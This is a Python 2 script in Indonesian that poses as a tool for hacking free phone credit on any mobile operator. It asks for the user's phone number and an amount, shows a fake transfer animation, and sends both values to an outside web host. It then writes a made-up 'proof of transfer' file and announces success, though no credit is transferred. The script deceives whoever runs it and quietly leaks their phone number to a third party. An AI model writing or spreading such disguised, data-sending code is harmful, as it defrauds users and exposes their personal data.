# coding:utf8

import os, sys, time, random, urllib2

logo = """
\033[37;1m╭━━━━━━━╮
┃  \033[32;1m● ══ \033[37;1m┃
┃\033[0;37m███████\033[37;1m┃        \033[37;1m─╤╦︻=(\033[31;1m◣\033[37;1m_\033[31;1m◢\033[37;1m)=︻╦╤─
┃\033[0;37m███████\033[37;1m┃
┃\033[0;37m███████\033[37;1m┃  \033[35;1m==[\033[34;1m HACK PULSA ALL OPERATOR \033[35;1m]==
\033[37;1m┃\033[0;37m███████\033[37;1m┃  \033[35;1m+-----------------------------+\033[35;1m
\033[37;1m┃\033[0;37m███████\033[37;1m┃ \033[35;1m |\033[37;1m Author\033[31;1m :\033[36;1m Rizky ID           \033[35;1m|
\033[37;1m┃   \033[33;1m○  \033[37;1m ┃ \033[35;1m |\033[37;1m Github\033[31;1m :\033[32;1m github.com/V4N654T \033[35;1m|
\033[37;1m╰━━━━━━━╯ \033[35;1m +-----------------------------+
\033[31;1m+==========================================+"""

def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[32;1m[=]\033[37;1m Sedang Transfer \033[31;1m' + animation[(i % len(animation))])
        sys.stdout.flush()


def rog():
    try:
        os.system('clear')
        print logo
        print '\033[35;1m==[\033[31;1m Note :\033[37;1m Jangan Menggunakan Titik Atau Koma\n           \033[37;1mUntuk Memasukan Jumlah Pulsa\n\033[35;1m==[\033[31;1m Ex   :\033[37;1m 50000'
        print "\033[31;1m+==========================================+"
        nomor = raw_input('\033[32;1m[✓]\033[37;1m Masukan Nomor Hp Kamu\033[35;1m =>\033[32;1m ')
        jumlh = raw_input('\033[32;1m[✓]\033[37;1m Masukan Jumlah Pulsa \033[35;1m =>\033[32;1m ')
        tik()
        urllib2.urlopen('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=' + nomor + '&paket=' + jumlh)
        cek = open('bukti.txt','w')
        cek.write('Pulsa Anda Sudah Kami Transfer Untuk Memiliki Bukti Yang Kuat Kami Membuat Bukti Di Bawah\n\n')
        cek.write('Nomor Hp Anda : '+nomor)
        cek.write('\nPulsa Senilai : '+jumlh)
        cek.write('\n\nTerima Kasih Sudah Memakai Tools Saya Yang Sangat Keren')
        cek.write('\n\n===[ TTD : R15K1 feat V4N654T ]===')
        cek.close()
        os.system('mv -f bukti.txt /storage/emulated/0')
        print "\n\033[31;1m+==========================================+"
        print '\033[32;1m[✓]\033[37;1m Pulsa Berhasil Di Transfer'
        print '\033[32;1m[✓]\033[37;1m Bukti Pengiriman\033[31;1m :\033[36;1m /storage/emulated/0/bukti.txt\n\n'
    except:
    	print "\n\033[31;1m+==========================================+"
        print '\033[31;1m[×]\033[37;1m Server Operator Sedang Bermasalah\n    Cobalah Untuk Sesaat Lagi\n\n'
        sys.exit()

rog()

